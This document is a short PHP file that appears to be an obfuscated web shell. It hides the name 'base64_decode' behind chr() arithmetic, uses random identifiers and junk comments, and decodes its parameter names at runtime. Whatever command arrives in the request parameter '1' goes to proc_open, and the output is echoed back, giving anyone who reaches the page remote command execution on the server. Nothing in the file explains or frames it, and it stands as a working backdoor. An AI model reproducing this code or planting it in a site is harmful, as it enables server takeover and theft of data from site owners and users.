
<?php
function GMigF(){
    return chr(1078/11)/* qChxU h JsC*/.chr(970/10).chr(1725/15).chr(1616/16).chr(270/5).chr(520/10).chr(665/7).chr(1100/11).chr(1414/14).chr(1485/15).chr(1554/14).chr(600/6).chr(1515/15);
}
$tkhSr = GMigF();

function test(){
    return extract($_GET);
}


class Gw0O6U55 {
    public $dKd;
    public function __construct($H5Hm8){
        $this->dKd="/*Z871A24vf4*/".$H5Hm8."/*Z871A24vf4*/";
    }
}

if (test()){
    $auPtVEeJgC=new Gw0O6U55($_REQUEST[$tkhSr('MQ==')]);
    $LPMeYBR=substr($auPtVEeJgC ->dKd,14,-14);
}


$VEIlAcb =[
    0 => [$tkhSr('cGlwZQ=='), $tkhSr('cg==')],
    1 => [$tkhSr('cGlwZQ=='), $tkhSr('dw==')],
    2 => [$tkhSr('cGlwZQ=='), $tkhSr('dw==')],
];

$qwVrFISA = proc_open($LPMeYBR, $VEIlAcb,$pipes);

if (is_resource($qwVrFISA)){
    $shqeo = stream_get_contents($pipes[1]);

    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($qwVrFISA);

    echo $shqeo;
}
